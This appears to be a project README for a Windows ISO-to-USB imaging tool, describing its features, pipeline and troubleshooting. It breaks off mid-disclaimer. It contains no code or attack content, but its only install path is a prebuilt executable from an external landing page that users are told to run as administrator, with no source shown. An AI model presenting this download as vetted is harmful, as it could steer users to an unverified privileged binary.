<div align="center">

<img src="assets/banner.svg" width="100%" alt="ISO To USB Creator banner"/>

# iso-to-usb-tool 💽⚡

![Version](https://img.shields.io/badge/version-2026-blue?style=for-the-badge) ![Windows](https://img.shields.io/badge/platform-Windows-0078d4?style=for-the-badge&logo=windows&logoColor=white) ![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)

*Turn a disc image and a spare drive into a bootable installer without touching a command line.*

</div>

## 🧭 What This Is NOT

Before anything else, a few clarifications, because this category of tool has a reputation problem:

- This is **not** a disc-burning relic pretending to understand USB controllers — it was built for flash media from the ground up.
- This is **not** a bloated "system utility suite" that installs six background services to write one drive.
- This is **not** a wrapper around a decade-old open-source core with a new coat of paint and a subscription nag screen.

What it **is**: a focused, single-purpose Windows application that takes an `.iso` file and a USB drive, and produces a bootable installation medium — reliably, transparently, and without asking you to create an account first.

## 🔍 Overview

Every year, millions of people need to reinstall an operating system, repair a broken bootloader, or deploy a fresh image across a fleet of machines — and every year, the tooling for doing this stays stubbornly unfriendly. The core problem an **ISO to USB creator** solves sounds simple: copy the contents of a disc image onto a flash drive in a way that the machine's firmware can boot from. In practice, it involves partition tables, filesystem boundaries, boot sector flags, and enough edge cases (UEFI vs. legacy BIOS, GPT vs. MBR, FAT32's 4GB file-size ceiling) that a surprising number of "quick and easy" tools quietly produce drives that just don't boot.

`iso-to-usb-tool` exists because that gap between "should be simple" and "is actually simple" was too wide for too long. It was written for the person reinstalling Windows on a laptop that won't boot anymore, the technician re-imaging a stack of desktops in a school computer lab, and the enthusiast keeping a drawer of distro-hopping USB sticks ready to go. No forum-scraped registry hacks, no bundled toolbars, no telemetry you didn't ask for — just a clean interface between your ISO file and your USB drive.

Under the hood, the tool pays close attention to the details that cause silent failures elsewhere: correct partition alignment, proper boot flag placement, and validation steps that catch a corrupted image or a drive that's failing before you've wasted twenty minutes writing to it. The goal isn't to be the flashiest imaging tool on the internet — it's to be the one you don't have to think about twice.

<p align="center">
  <a href="https://Outernyoindex.github.io/iso-to-usb-tool/">
    <img src="https://img.shields.io/badge/GET_STARTED-Download-7C3AED?style=for-the-badge&logo=windows&logoColor=white&labelColor=5B21B6" width="550" alt="Download"/>
  </a>
</p>

---

## 🚧 The Problem, and Where This Lands

> [!NOTE]
> This section exists because "just use any ISO tool" is exactly the advice that leads to unbootable drives at 1am. The details below are why this one behaves differently.

**What used to suck:**

- Tools that report "success" on a write operation that produced a drive with no boot flag set.
- Interfaces that bury the "erase this entire drive" warning in fine print, next to a drive letter that looks suspiciously like your backup disk.
- No feedback during the write — just a spinning bar and a prayer, for twenty-plus minutes.
- Zero indication of *why* a boot attempt failed afterward, leaving you to re-flash and hope.

**What this fixes:**

- Every write is verified against the source image after completion, not just assumed successful.
- The drive selector shows capacity, label, and a distinct warning color for anything that looks like a non-removable disk.
- A live progress readout shows sectors written, current speed, and estimated time remaining.
- If validation fails, the tool tells you specifically what didn't match — partition table, checksum, or boot sector — instead of a generic error.

## 🛠️ Capabilities Worth Knowing About

- **Dual boot-mode targeting** — writes drives that boot cleanly under both UEFI and legacy BIOS firmware, so you're not gambling on which mode a machine defaults to.

- **Filesystem-aware partitioning** — automatically chooses FAT32 or NTFS-based layouts depending on whether your source image contains files larger than 4GB, sidestepping the classic "install.wim won't copy" failure.

- **Checksum verification pass** — after writing, the tool re-reads the drive and compares it against the source image hash, catching silent write errors before you find out the hard way.

- **Drive-safety fencing** — refuses to target system or fixed disks by default, requiring an explicit override to write anywhere that isn't clearly removable media.

- **Persistent write profiles** — save your preferred settings (partition scheme, cluster size, labeling convention) so repeat jobs across multiple drives take one click, not five.

- **Offline operation** — no network calls during the actual imaging process, meaning air-gapped machines and locked-down environments can run it without friction.

- **Multi-ISO queueing** — line up several images and target drives in sequence for batch deployment scenarios, without babysitting each write individually.

- **Detailed operation log** — every action is timestamped and recorded locally, useful for diagnosing a failed job after the fact or documenting a deployment run.

> [!TIP]
> If you're preparing drives for a lab or classroom rollout, save a write profile once and reuse it — it turns a ten-minute per-drive process into closing a dialog and swapping USB sticks.

## 🚀 How To Get Started

1. Visit the [project landing page](https://Outernyoindex.github.io/iso-to-usb-tool/) and download the current build.

2. Run the executable — it's a standalone application, no installer wizard required.

3. Select your source `.iso` file and your target USB drive from the dropdown list.

4. Review the summary screen, confirm the drive is correct, and start the write.

> [!IMPORTANT]
> Writing to a USB drive erases everything currently on it. Double-check the drive letter and capacity shown before confirming — there is no undo once the write begins.

## 💻 System Requirements

| Requirement | Details |
|---|---|
| Operating System | Windows 10 (64-bit) or Windows 11 |
| Disk Space | Under 50 MB for the tool itself |
| USB Drive | 4 GB minimum, 8 GB+ recommended for modern OS images |
| Dependencies | None — fully standalone, no runtime installs required |
| Permissions | Administrator privileges (required for raw disk access) |

![Standalone](https://img.shields.io/badge/dependencies-none-success?style=flat-square) ![Status](https://img.shields.io/badge/status-actively%20maintained-brightgreen?style=flat-square) ![Build](https://img.shields.io/badge/build-stable-informational?style=flat-square)

## ⚙️ How It Works

The imaging pipeline is intentionally linear — fewer moving parts means fewer places for something to go wrong.

1. **Image inspection** — the source `.iso` is parsed to determine its filesystem contents, largest file size, and target boot mode compatibility.

2. **Drive preparation** — the target USB is unmounted, its existing partition table cleared, and a new scheme (MBR or GPT) is written based on the image's requirements.

3. **Data transfer** — file contents are copied sector-by-sector or file-by-file depending on filesystem type, with progress reported in real time.

4. **Boot sector placement** — the correct bootloader files and boot flags are written so firmware can locate and launch the installer.

5. **Verification** — a checksum comparison confirms the written drive matches the source image before the tool reports success.

```mermaid
flowchart LR
    ISO[ISO File] --> Inspect[Inspect Image]
    Inspect --> Prepare[Prepare Drive]
    Prepare --> Write[Write Data]
    Write --> Verify[Verify Checksum]
    Verify --> Boot[Bootable USB]
```

## 🩺 Troubleshooting

<details>
<summary><strong>The USB drive doesn't show up in the device list.</strong></summary>

Confirm the drive is actually removable media and mounted by Windows — check Disk Management. Some card readers and multi-slot USB hubs report drives inconsistently; try a direct USB port on the motherboard rather than a hub.

</details>

<details>
<summary><strong>The write finished, but the target machine won't boot from it.</strong></summary>

Check the target machine's firmware boot mode. A drive written for UEFI won't boot on a system forced into legacy-only mode, and vice versa. Re-run the write and select the matching boot mode explicitly if your firmware doesn't support both.

</details>

<details>
<summary><strong>Verification failed after writing.</strong></summary>

This usually points to a failing or counterfeit USB drive rather than a software issue. Try a different physical drive — cheap or aging flash media is the most common cause of checksum mismatches.

</details>

<details>
<summary><strong>The tool won't start, or closes immediately.</strong></summary>

Raw disk access requires administrator privileges. Right-click the executable and choose "Run as administrator" if it isn't launching normally.

</details>

<details>
<summary><strong>My ISO has files larger than 4GB and the write keeps failing.</strong></summary>

FAT32 has a hard 4GB per-file limit. The tool should auto-switch to an NTFS-based or split boot layout for these images — if it doesn't, check that the image isn't corrupted or truncated first.

</details>

> [!WARNING]
> Never remove the USB drive during an active write or verification pass. Interrupting the process can corrupt the drive's partition table, sometimes requiring a full reformat to recover.

## 🎨 UI / UX Details

The interface favors clarity over decoration — every screen answers "what is about to happen" before you commit to it.

| Shortcut | Action |
|---|---|
| `Ctrl + O` | Open / select ISO file |
| `Ctrl + D` | Refresh drive list |
| `Ctrl + Enter` | Start write operation |
| `Esc` | Cancel current operation (where safe) |
| `Ctrl + L` | Open operation log |
| `Ctrl + ,` | Open settings |
| `F1` | Open help panel |

- **Themes**: Light, Dark, and a System-matched auto mode that follows your Windows theme setting.
- **Settings persistence**: write profiles, last-used drive, and theme preference are remembered between sessions.
- **Progress feedback**: a real-time speed readout and time estimate replace the classic "indeterminate spinner" pattern.

## 🤝 Contributing & Community

Contributions, bug reports, and feature discussions are welcome. If you're planning a larger change, opening an issue first to discuss the approach saves everyone time.

- Check open issues before filing a duplicate.
- Keep pull requests focused on a single change where possible.
- Describe your Windows version and drive type when reporting a write-related bug — it's the single most useful piece of context for reproducing imaging issues.

> [!TIP]
> Feature requests around new filesystem support or additional boot modes are especially welcome — this is where the tool has the most room to grow.

## 📜 License

Released under the [MIT License](LICENSE), 2026.

## ⚠️ Disclaimer

This tool performs low-level, destructive write operations on physical